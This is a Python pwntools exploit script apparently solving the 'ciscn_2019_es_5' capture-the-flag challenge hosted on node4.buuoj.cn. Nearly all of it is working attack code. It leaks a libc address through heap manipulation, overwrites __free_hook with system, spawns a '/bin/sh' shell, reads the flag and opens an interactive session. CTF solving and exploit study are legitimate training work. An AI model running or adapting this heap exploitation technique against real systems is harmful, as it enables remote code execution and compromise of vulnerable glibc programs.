# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ciscn_2019_es_5'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26850'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice:',num)

def add( size , content = 'a' ):
    cmd(1)
    sla('size?>' , size)
    sa('content:' , content)

def show( idx ):
    cmd(3)
    sla('Index:' , idx)

def edit(idx ):
    cmd(2)
    sla('Index:' , idx)
    # sa('content:' , content)

def delete( idx ):
    cmd(4)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)
# malloc 即使参数为 0 也能申请最小单位的 chunk
# realloc 还有 free 的功能呢

def attack():
    
    add(0x410)
    add(0 , '')
    delete(0)
    add(0x410)
    show(0)
    
    __malloc_hook =( l64() & 0xfffffffffff0 ) - 0x30
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    lg('__malloc_hook' , __malloc_hook)

    edit( 1 )
    delete(1)
    add(0x18 , p64(__free_hook - 8))
    add(0x18 , flat( '/bin/sh\x00' , system_addr ))

    delete(2)
    # dbg()
    
    ''

attack()
p.success(getShell())
p.interactive()

'''
@File    :   ciscn_2019_es_5.py
@Time    :   2021/10/29 15:43:19
@Author  :   Niyah 
'''